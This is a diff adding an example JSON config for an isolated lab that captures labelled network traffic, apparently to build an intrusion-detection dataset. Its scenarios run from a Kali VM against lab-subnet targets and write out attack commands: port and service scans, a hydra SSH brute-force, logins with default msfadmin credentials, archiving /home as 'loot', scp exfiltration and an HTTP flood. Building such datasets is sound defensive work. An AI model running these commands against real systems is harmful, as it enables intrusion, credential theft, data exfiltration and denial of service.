@@ -1,0 +1,47 @@
+{
+  "_comment": "Isolated NetForecast dataset-collection lab. Copy to lab_config.json and edit for your machine. Every scenario target must be inside lab_subnet or the harness refuses to run. See LAB_SETUP.md.",
+  "lab_subnet": "192.168.56.0/24",
+  "runs": 3,
+  "capture": {
+    "dumpcap": "dumpcap",
+    "interface": "vboxnet0",
+    "_interface_note": "Linux VirtualBox host-only is usually vboxnet0; on Windows it is the 'VirtualBox Host-Only Ethernet Adapter' (run 'dumpcap -D' to list)."
+  },
+  "attacker": {
+    "vm": "kali-lab",
+    "snapshot": "clean",
+    "ip": "192.168.56.10",
+    "ssh": "kali@192.168.56.10",
+    "_ssh_note": "Key-based SSH from the lab host into the attacker VM. Scenarios with run_on=attacker execute here."
+  },
+  "targets": [
+    { "vm": "target-victim", "snapshot": "clean", "ip": "192.168.56.20" },
+    { "vm": "target-peer", "snapshot": "clean", "ip": "192.168.56.21" }
+  ],
+  "gap_seconds": 30,
+  "boot_wait_seconds": 60,
+  "scenarios": [
+    { "id": "benign_web", "label": "Benign", "run_on": "attacker", "target": "192.168.56.20", "duration_s": 90,
+      "command": "for i in $(seq 1 40); do curl -s -o /dev/null http://{target}/; sleep 2; done" },
+    { "id": "recon_portscan", "label": "Reconnaissance", "run_on": "attacker", "target": "192.168.56.20", "duration_s": 120,
+      "command": "nmap -sS -T4 -p 1-1000 {target}" },
+    { "id": "recon_servicescan", "label": "Reconnaissance", "run_on": "attacker", "target": "192.168.56.20", "duration_s": 120,
+      "command": "nmap -sV -p 21,22,23,25,80,139,445,3306,5432 {target}" },
+    { "id": "credential_test", "label": "CredentialAccess", "run_on": "attacker", "target": "192.168.56.20", "duration_s": 180,
+      "command": "hydra -l msfadmin -P /usr/share/wordlists/nmap.lst -t 4 -f {target} ssh || true" },
+    { "id": "web_interaction", "label": "InitialAccess", "run_on": "attacker", "target": "192.168.56.20", "duration_s": 120,
+      "command": "for p in / /login.php /dvwa/ /mutillidae/ '/?id=1'; do curl -s -o /dev/null \"http://{target}$p\"; sleep 3; done" },
+    { "id": "discovery", "label": "Discovery", "run_on": "attacker", "target": "192.168.56.20", "duration_s": 90,
+      "command": "smbclient -L //{target} -N || true; snmpwalk -v1 -c public {target} || true" },
+    { "id": "lateral_move", "label": "LateralMovement", "run_on": "attacker", "target": "192.168.56.21", "duration_s": 120,
+      "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no msfadmin@{target} 'id; uname -a; ls -la /home' || true" },
+    { "id": "c2_beacon", "label": "CommandAndControl", "run_on": "attacker", "target": "192.168.56.20", "duration_s": 300,
+      "command": "for i in $(seq 1 30); do curl -s -o /dev/null http://{target}/; sleep 10; done" },
+    { "id": "collection", "label": "Collection", "run_on": "attacker", "target": "192.168.56.21", "duration_s": 90,
+      "command": "sshpass -p 'msfadmin' ssh -o StrictHostKeyChecking=no msfadmin@{target} 'tar czf /tmp/loot.tgz /home 2>/dev/null; ls -la /tmp/loot.tgz' || true" },
+    { "id": "exfiltration", "label": "Exfiltration", "run_on": "attacker", "target": "192.168.56.21", "duration_s": 120,
+      "command": "sshpass -p 'msfadmin' scp -o StrictHostKeyChecking=no msfadmin@{target}:/tmp/loot.tgz /tmp/loot.tgz || true" },
+    { "id": "load_test", "label": "Impact", "run_on": "attacker", "target": "192.168.56.20", "duration_s": 120,
+      "command": "ab -n 20000 -c 50 http://{target}/ || true" }
+  ]
+}
